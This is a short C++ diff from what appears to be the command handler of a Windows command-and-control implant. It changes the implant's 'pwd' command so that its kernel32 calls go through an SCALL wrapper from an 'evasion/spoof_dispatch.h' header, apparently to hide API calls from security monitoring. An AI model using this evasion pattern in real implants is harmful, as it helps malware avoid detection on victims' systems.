@@ -4,6 +4,7 @@
 #include <parser.h>
 #include <config.h>
 #include <strings.h>
+#include <evasion/spoof_dispatch.h>
 
 #ifdef INCLUDE_CMD_PWD
 
@@ -16,10 +17,10 @@ auto declfn starburst::cmd_pwd(
     _In_    Parser*   params
 ) -> void {
     wchar_t dir_w[520] = { 0 };
-    inst.kernel32.GetCurrentDirectoryW( 520, dir_w );
+    SCALL( inst, kernel32.GetCurrentDirectoryW, 520, dir_w );
 
     char dir[520] = { 0 };
-    inst.kernel32.WideCharToMultiByte( CP_ACP, 0, dir_w, -1, dir, 520, nullptr, nullptr );
+    SCALL( inst, kernel32.WideCharToMultiByte, CP_ACP, 0, dir_w, -1, dir, 520, nullptr, nullptr );
 
     queue_response( inst, task_uuid, RESPONSE_SUCCESS, dir );
 }
